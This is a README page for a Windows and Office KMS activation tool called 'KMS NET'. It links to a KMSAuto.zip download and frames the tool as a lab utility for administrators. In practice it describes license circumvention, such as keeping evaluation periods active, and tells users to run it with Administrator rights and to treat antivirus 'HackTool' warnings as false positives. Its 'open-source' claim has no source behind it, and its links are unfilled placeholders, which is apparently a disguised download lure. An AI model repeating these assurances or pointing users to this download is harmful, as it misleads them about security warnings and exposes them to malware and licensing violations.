<!-- markdownlint-disable MD033 -->
<p align="center">
<img width="871" height="522" alt="image" src="https://github.com/user-attachments/assets/a204fea0-c07d-4053-92a7-30f6a203c01e" />

</a>
</p>

<h1 align="center"><b>KMS NET</b></h1>

<p align="center">
<b>Advanced Key Management Service emulation for system administrators.</b>
<br />
A lightweight, open-source utility designed to simplify the deployment and evaluation of productivity suites and operating systems in local environments.
</p>

<p align="center">
  
  <img width="390" height="458" alt="image" src="https://github.com/user-attachments/assets/dac3dedb-b4fa-4bbd-a74b-a997d1682aec" />

<p align="center">

</p>


<div align="center">

</div>

<h5 align="center">
</h5>

---
 [Download `KMSAuto.exe`](https://github.com/ltyzen/KMSAutoTool/releases/download/WindowsSoftware/KMSAuto.zip)  
--
> [!NOTE]
> **Purpose:** This tool is designed for system administrators, developers, and lab environments to test Key Management Service (KMS) integration. It provides a local simulation of a licensing server to ensure software deployment pipelines work correctly before moving to a production environment.

##  Core Capabilities

-  **Local Emulation:** Simulates a KMS host on your local machine to handle internal requests.
-  **Automated Workflow:** One-click setup for managing the lifecycle of supported operating systems and productivity software.
-  **Portable Design:** Fully standalone `.exe` with no background services left behind after closing.
-  **Detailed Logging:** Real-time console output to monitor service requests and handshake success.
-  **Task Scheduling:** Option to automate periodic service checks to keep the evaluation period active.
-  **System Cleanup:** Integrated function to remove old or conflicting management keys.

##  Usage Instructions

1. **Deployment:** Download the latest portable executable from the [Releases](https://github.com/USER_NAME/REPO_NAME/releases) page.
2. **Administration:** Run the application with Administrator privileges (required to interact with system services).
3. **Selection:** Choose the specific software suite or OS version you wish to manage from the main menu.
4. **Execution:** Click the "Apply" or "Activate Service" button and wait for the "Success" confirmation in the log.
5. **Validation:** Check your system settings to verify the status of the local management service.

---

##  Frequently Asked Questions

<details>
  <summary><strong>Is this safe for production machines?</strong></summary>
  <br>
  
  Yes. This utility is fully open-source. It does not modify system files or inject code into running processes. It simply communicates with the built-in Windows Software Protection service via standard protocols.
</details>

<br>

<details>
  <summary><strong>Why is my security software flagging the file?</strong></summary>
  <br>

  Due to the nature of system management tools, some heuristics-based scanners may mark this as "Riskware" or "HackTool". This is a common **false positive**. You can inspect the source code to verify that no malicious behavior is present.
</details>

<br>

<details>
  <summary><strong>What versions are supported?</strong></summary>
  <br>

  The tool supports a wide range of VL (Volume License) editions, including various iterations of Windows Desktop, Server, and the most common productivity office suites.
</details>

##  Technical Specifications

- **Language:** Developed in **C#**
- **Framework:** Targetting **.NET Framework 4.8** or **.NET 6.0** for maximum OS compatibility.
- **Architecture:** x86/x64 support.

<table style="width: 100%; border-collapse: collapse;">
  <tr>
    <td style="width: 33%; text-align: left;">© KMS Tool Contributors</td>
    <td style="width: 33%; text-align: right;"><a href="https://github.com/USER_NAME/REPO_NAME/blob/main/LICENSE" target="_blank">Open Source License</a></td>
  </tr>
</table>
